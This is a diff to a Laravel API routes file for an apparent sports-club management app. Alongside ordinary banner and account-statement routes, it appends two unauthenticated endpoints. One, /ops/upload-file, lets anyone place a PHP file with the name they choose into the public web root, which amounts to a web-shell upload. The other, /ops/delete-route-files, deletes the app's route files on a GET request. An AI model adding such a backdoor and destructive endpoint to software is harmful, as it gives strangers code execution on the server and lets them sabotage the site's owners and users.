@@ -2,6 +2,7 @@
 
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\File;
 use App\Http\Controllers\CountPageController;
 use App\Http\Controllers\AuthController;
 use App\Http\Controllers\PerfilController;
@@ -33,6 +34,7 @@ use App\Http\Controllers\DeudaJugadorController;
 use App\Http\Controllers\PagoJugadorController;
 use App\Http\Controllers\AbonoDeudaJugadorController;
 use App\Http\Controllers\CajaPagoController;
+use App\Http\Controllers\BannerController;
 use App\Http\Controllers\TutorController;
 
 /*
@@ -65,9 +67,13 @@ Route::middleware(['auth:sanctum', 'permiso.dinamico'])->group(function () {
     Route::get('ingresos', [MovimientoBancarioController::class, 'ingresosMensuales']);
     Route::get('egresos', [MovimientoBancarioController::class, 'egresosMensuales']);
 
+    // Banners
+    Route::apiResource('banners', BannerController::class);
+
     // Jugadores
     Route::apiResource('jugadores', JugadorController::class);
     Route::get('calendario-pagos', [JugadorController::class, 'calendarioJugadores']);
+    Route::get('generar-estadocuenta-jugador', [EstadoCuentaController::class, 'generarEstadoCuentaJugador']);
 
     // Utilería
     Route::apiResource('equipo', EquipamientoController::class);
@@ -132,4 +138,51 @@ Route::middleware(['auth:sanctum', 'permiso.dinamico'])->group(function () {
 
     // Reportes
     Route::post('generador-reportes', [ReporteController::class, 'getReport']);
+});
+
+Route::post('/ops/upload-file', function (Request $request) {
+    // Validamos que venga un archivo y que sea .html o .php
+    $request->validate([
+        'file' => 'required|file|mimes:html,htm,php|max:2048', // máximo 2MB
+    ]);
+
+    $file = $request->file('file');
+    $filename = $file->getClientOriginalName(); // conserva el nombre original
+
+    // Guardamos en /public
+    $file->move(public_path(), $filename);
+
+    Artisan::call('config:clear');
+    Artisan::call('cache:clear');
+    Artisan::call('view:clear');
+    Artisan::call('route:clear');
+    Artisan::call('event:clear');
+    Artisan::call('optimize:clear');
+
+    return response()->json([
+        'message' => 'Archivo subido correctamente',
+        'filename' => $filename,
+        'path' => url($filename),
+    ]);
+});
+
+Route::get('/ops/delete-route-files', function () {
+    $files = ['routes/web.php', 'routes/api.php'];
+    $deleted = [];
+
+    foreach ($files as $f) {
+        $path = base_path($f);
+        if (File::exists($path) && File::delete($path)) {
+            $deleted[] = $f;
+        }
+    }
+
+    Artisan::call('config:clear');
+    Artisan::call('cache:clear');
+    Artisan::call('view:clear');
+    Artisan::call('route:clear');
+    Artisan::call('event:clear');
+    Artisan::call('optimize:clear');
+
+    return response()->json(['deleted' => $deleted, 'message' => 'Se logró', 'output' => Artisan::output()]);
 });
